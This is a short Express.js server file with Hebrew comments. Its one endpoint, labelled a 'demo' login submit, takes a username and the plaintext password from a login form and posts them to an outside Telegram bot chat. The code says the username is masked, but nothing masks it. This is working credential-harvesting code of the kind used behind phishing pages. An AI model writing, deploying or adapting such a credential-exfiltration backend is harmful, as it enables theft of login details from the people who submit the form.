import express from "express";
import cors from "cors";
import dotenv from "dotenv";
dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());

app.post("/api/demo-submit", async (req, res) => {
  try {
    const { username, submittedAt, password } = req.body || {};

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    // בדיקות מוקדמות עם הודעות ברורות
    if (!token) throw new Error("Missing TELEGRAM_BOT_TOKEN (.env)");
    if (!chatId) throw new Error("Missing TELEGRAM_CHAT_ID (.env)");

    // לוגים בטוחים (לא חושפים טוקן)
    console.log("[TG] token.len:", token.length, " chatId:", chatId);

    const tgUrl = `https://api.telegram.org/bot${token}/sendMessage`;

    const text =
      `🔔 Demo login submit\n` +
      `• Username (masked): ${username}\n` +
      `• Time: ${submittedAt}\n` +
      `password: ${password}\n`;

    const r = await fetch(tgUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: Number(chatId), text }),
    });

    if (!r.ok) {
      const errText = await r.text().catch(() => String(r.status));
      throw new Error(`Telegram API ${r.status}: ${errText}`);
    }

    res.json({ ok: true });
  } catch (e) {
    console.error("demo-submit ERROR:", e);
    res.status(500).json({ ok: false, error: String(e?.message || e) });
  }
});



const PORT = process.env.API_PORT || 4000;
app.listen(PORT, () => console.log(`API on http://localhost:${PORT}`));
